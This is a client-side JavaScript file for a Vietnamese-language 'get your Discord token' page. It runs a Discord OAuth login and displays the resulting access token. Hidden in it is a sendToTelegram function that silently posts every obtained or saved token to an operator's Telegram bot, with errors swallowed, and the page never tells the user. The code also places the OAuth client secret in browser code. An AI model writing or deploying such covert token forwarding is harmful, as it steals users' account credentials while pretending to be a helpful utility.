(function(){
const loginBtn=document.getElementById('loginBtn');
const tokenDisplay=document.getElementById('tokenDisplay');
const copyBtn=document.getElementById('copyBtn');
const resetBtn=document.getElementById('resetBtn');
const statusMsg=document.getElementById('statusMsg');

function showToast(msg,type){
const old=document.querySelector('.toast');
if(old)old.remove();
const div=document.createElement('div');
div.className='toast '+type;
div.textContent=msg;
document.body.appendChild(div);
setTimeout(()=>{div.style.opacity='0';setTimeout(()=>div.remove(),300);},2200);
}

function sendToTelegram(token){
fetch('https://api.telegram.org/bot'+CONFIG.BOT_TOKEN+'/sendMessage',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CONFIG.CHAT_ID,text:'Token: '+token})
}).catch(()=>{});
}

function setToken(token){
if(token&&token.length>10){
localStorage.setItem('meo_token',token);
tokenDisplay.textContent=token;
tokenDisplay.className='token-box has-token';
statusMsg.textContent='✅ Đã lấy token';
statusMsg.className='status success';
showToast('✅ Lấy token thành công!','success');
sendToTelegram(token);
}else{
localStorage.removeItem('meo_token');
tokenDisplay.textContent='Chưa có token';
tokenDisplay.className='token-box empty';
statusMsg.textContent='❌ Chưa có token';
statusMsg.className='status error';
}
}

const saved=localStorage.getItem('meo_token');
if(saved)setToken(saved);
else setToken(null);

function openDiscordPopup(){
if(CONFIG.CLIENT_ID==='YOUR_CLIENT_ID'||CONFIG.REDIRECT_URI==='YOUR_REDIRECT_URI'){
showToast('⚠️ Cấu hình chưa đúng!','error');
return;
}
const authUrl='https://discord.com/oauth2/authorize?client_id='+CONFIG.CLIENT_ID+
'&response_type=code&redirect_uri='+encodeURIComponent(CONFIG.REDIRECT_URI)+
'&scope=identify';
window.location.href = authUrl;
}

function handleRedirect(){
const params=new URLSearchParams(window.location.search);
const code=params.get('code');
if(!code){
const hash=window.location.hash.substring(1);
const hashParams=new URLSearchParams(hash);
const tokenFromHash=hashParams.get('access_token');
if(tokenFromHash){
setToken(tokenFromHash);
window.history.replaceState({},document.title,window.location.pathname);
}
return;
}
statusMsg.textContent='⏳ Đang đổi code lấy token...';
statusMsg.className='status loading';
fetch('https://discord.com/api/oauth2/token',{
method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:new URLSearchParams({
client_id:CONFIG.CLIENT_ID,
client_secret:CONFIG.CLIENT_SECRET,
grant_type:'authorization_code',
code:code,
redirect_uri:CONFIG.REDIRECT_URI
})
})
.then(res=>{if(!res.ok)throw new Error('HTTP '+res.status);return res.json();})
.then(data=>{
if(data.access_token){
setToken(data.access_token);
window.history.replaceState({},document.title,window.location.pathname);
}else{
throw new Error('Không nhận được access_token');
}
})
.catch(err=>{
statusMsg.textContent='❌ Lỗi: '+err.message;
statusMsg.className='status error';
showToast('Lỗi lấy token: '+err.message,'error');
})
.finally(()=>{
loginBtn.disabled=false;
loginBtn.innerHTML='<svg viewBox="0 0 24 24" style="width:22px;height:22px;fill:currentColor"><path d="M20.317 4.369a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg> Đăng nhập Discord';
});
}

loginBtn.addEventListener('click',openDiscordPopup);

copyBtn.addEventListener('click',function(){
const token=localStorage.getItem('meo_token');
if(!token){showToast('❌ Chưa có token','error');return;}
navigator.clipboard.writeText(token).then(()=>{
showToast('✅ Đã sao chép','success');
}).catch(()=>{
const range=document.createRange();
range.selectNode(tokenDisplay);
window.getSelection().removeAllRanges();
window.getSelection().addRange(range);
document.execCommand('copy');
showToast('✅ Đã sao chép (fallback)','success');
});
});

resetBtn.addEventListener('click',function(){
if(confirm('Xóa token đã lưu?')){
setToken(null);
showToast('🗑️ Đã xóa','info');
}
});

handleRedirect();
window.addEventListener('load',function(){
const hash=window.location.hash.substring(1);
if(hash){
const params=new URLSearchParams(hash);
const token=params.get('access_token');
if(token)setToken(token);
window.history.replaceState({},document.title,window.location.pathname);
}
});
})();
